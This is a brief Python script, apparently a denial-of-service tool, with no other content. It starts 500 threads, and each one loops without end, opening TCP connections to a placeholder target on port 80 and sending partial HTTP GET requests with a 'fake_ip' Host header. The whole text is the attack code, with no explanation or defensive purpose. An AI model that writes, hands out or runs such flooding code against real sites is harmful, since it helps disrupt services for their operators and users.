import socket
import random
import threading
import time
import requests

target = 'www.targetwebsite.com'
port = 80
fake_ip = '182.21.20.32'

def ddos_attack():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        sock.close()

for i in range(500):
    thread = threading.Thread(target=ddos_attack)
    thread.start()

    time.sleep(0.01)
